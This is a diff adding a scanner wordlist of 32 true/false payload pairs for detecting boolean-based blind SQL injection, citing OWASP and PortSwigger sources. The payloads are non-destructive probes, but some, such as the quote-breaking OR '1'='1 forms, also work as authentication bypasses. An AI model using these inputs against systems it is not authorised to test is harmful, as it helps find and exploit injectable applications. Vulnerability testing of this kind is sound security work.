@@ -1,0 +1,40 @@
+# Boolean-based Blind SQL Injection payload pairs
+# Format: <true_payload> ||| <false_payload>   (one pair per line; "#" lines are comments)
+# TRUE expression must evaluate to a normal/positive result, FALSE expression to a
+# negative/different one. Detection compares the two responses (status, length,
+# similarity) — no destructive statements are used.
+# Source: OWASP WSTG-INPV-05 (Testing for SQL Injection, boolean blind),
+#         PortSwigger Web Security Academy, PayloadsAllTheThings
+# Total: 32 payloads
+1 AND 1=1 ||| 1 AND 1=2
+1 AND 2=2 ||| 1 AND 2=3
+' AND '1'='1 ||| ' AND '1'='2
+" AND "1"="1 ||| " AND "1"="2
+1' AND '1'='1 ||| 1' AND '1'='2
+1 AND 1=1-- - ||| 1 AND 1=2-- -
+1 AND 1=1-- ||| 1 AND 1=2--
+1 AND 1=1# ||| 1 AND 1=2#
+1 AND 1=1/* ||| 1 AND 1=2/*
+1 AND 1=1/* */ ||| 1 AND 1=2/* */
+1) AND (1=1) ||| 1) AND (1=2)
+1)) AND ((1=1)) ||| 1)) AND ((1=2))
+1 AND 'a'='a' ||| 1 AND 'a'='b'
+1 AND (SELECT 1)=1 ||| 1 AND (SELECT 1)=2
+1 AND 'a' LIKE 'a' ||| 1 AND 'a' LIKE 'b'
+1 AND 1 IN (1) ||| 1 AND 1 IN (2)
+1 AND 1 BETWEEN 1 AND 1 ||| 1 AND 1 BETWEEN 2 AND 3
+1 OR 1=1 ||| 1 OR 1=2
+1 OR '1'='1 ||| 1 OR '1'='2
+1' OR '1'='1 ||| 1' OR '1'='2
+1' OR '1'='1'-- - ||| 1' OR '1'='2'-- -
+') OR ('1'='1 ||| ') OR ('1'='2
+1 AND ASCII('A')=65 ||| 1 AND ASCII('A')=66
+1 AND LENGTH('abc')=3 ||| 1 AND LENGTH('abc')=4
+1 AND SUBSTRING('abc',1,1)='a' ||| 1 AND SUBSTRING('abc',1,1)='b'
+1 AND 'notscan'='notscan' ||| 1 AND 'notscan'='other'
+1 AND (1=1) AND ('a'='a') ||| 1 AND (1=2) AND ('a'='b')
+1 AND 1=CAST(1 AS INT) ||| 1 AND 1=CAST(2 AS INT)
+1 AND sqlite_version() IS NOT NULL ||| 1 AND sqlite_version() IS NULL
+1 AND 1=1 AND 2=2 ||| 1 AND 1=1 AND 2=3
+1 AND 1=(SELECT 1) ||| 1 AND 1=(SELECT 2)
+1 AND 1=(SELECT 1 FROM dual) ||| 1 AND 1=(SELECT 2 FROM dual)
